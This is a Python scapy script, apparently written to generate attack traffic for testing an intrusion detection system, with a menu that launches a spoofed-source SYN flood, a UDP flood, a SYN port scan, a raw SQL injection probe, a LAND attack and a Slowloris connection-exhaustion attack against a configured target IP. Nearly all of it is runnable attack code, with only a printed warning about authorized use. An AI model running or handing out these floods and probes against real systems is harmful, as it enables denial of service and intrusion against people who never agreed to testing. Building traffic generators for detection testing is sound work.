from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP
import random
import threading
import time

# Configuration
TARGET_IP = "192.168.18.3"  # Replace with your test target
SOURCE_IP = "192.168.18.5"  # Replace with your source IP
TEST_PORT = 80                # Common web service port

def syn_flood(target_ip, target_port, count=100):
    """Simulate TCP SYN Flood attack"""
    print(f"[!] Starting SYN Flood attack on {target_ip}:{target_port}")
    for _ in range(count):
        send(IP(src=RandIP(), dst=target_ip)/TCP(sport=RandShort(), dport=target_port, flags="S"), verbose=0)
    print("[+] SYN Flood packets sent")

def udp_flood(target_ip, target_port, count=500):
    """Simulate UDP Flood attack"""
    print(f"[!] Starting UDP Flood attack on {target_ip}:{target_port}")
    for _ in range(count):
        send(IP(src=RandIP(), dst=target_ip)/UDP(sport=RandShort(), dport=target_port)/Raw(load="X"*100), verbose=0)
    print("[+] UDP Flood packets sent")

def port_scan(target_ip, ports_to_scan=range(1, 1024)):
    """Simulate TCP Port Scan"""
    print(f"[!] Starting port scan on {target_ip}")
    for port in ports_to_scan:
        send(IP(dst=target_ip)/TCP(dport=port, flags="S"), verbose=0)
    print("[+] Port scan packets sent")

def sql_injection_probe(target_ip, target_port):
    """Simulate SQL Injection attempt"""
    print(f"[!] Sending SQLi probe to {target_ip}:{target_port}")
    malicious_payload = "GET /index.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\r\nHost: test.com\r\n\r\n"
    send(IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=malicious_payload), verbose=0)
    print("[+] SQLi payload sent")

def land_attack(target_ip):
    """Simulate LAND attack (source == destination)"""
    print(f"[!] Starting LAND attack on {target_ip}")
    send(IP(src=target_ip, dst=target_ip)/TCP(sport=80, dport=80, flags="S"), verbose=0)
    print("[+] LAND attack packet sent")

def slowloris_attack(target_ip, target_port):
    """Simulate Slowloris partial connections"""
    print(f"[!] Starting Slowloris attack on {target_ip}:{target_port}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
        while True:
            s.send(b"X-a: b\r\n")
            time.sleep(10)
    except Exception as e:
        print(f"[-] Slowloris error: {e}")

def menu():
    print("\n=== IDS Test Attack Menu ===")
    print("1. TCP SYN Flood Attack")
    print("2. UDP Flood Attack")
    print("3. Port Scan")
    print("4. SQL Injection Probe")
    print("5. LAND Attack")
    print("6. Slowloris Attack")
    print("7. Exit")
    return input("Select attack type (1-7): ")

def main():
    print("[!] WARNING: This script generates malicious network traffic!")
    print("[!] Only use on authorized networks/systems!\n")
    
    while True:
        choice = menu()
        
        if choice == '1':
            threading.Thread(target=syn_flood, args=(TARGET_IP, TEST_PORT)).start()
        elif choice == '2':
            threading.Thread(target=udp_flood, args=(TARGET_IP, TEST_PORT)).start()
        elif choice == '3':
            threading.Thread(target=port_scan, args=(TARGET_IP,)).start()
        elif choice == '4':
            threading.Thread(target=sql_injection_probe, args=(TARGET_IP, TEST_PORT)).start()
        elif choice == '5':
            threading.Thread(target=land_attack, args=(TARGET_IP,)).start()
        elif choice == '6':
            threading.Thread(target=slowloris_attack, args=(TARGET_IP, TEST_PORT)).start()
        elif choice == '7':
            print("[+] Exiting...")
            break
        else:
            print("[-] Invalid choice")

if __name__ == "__main__":
    main()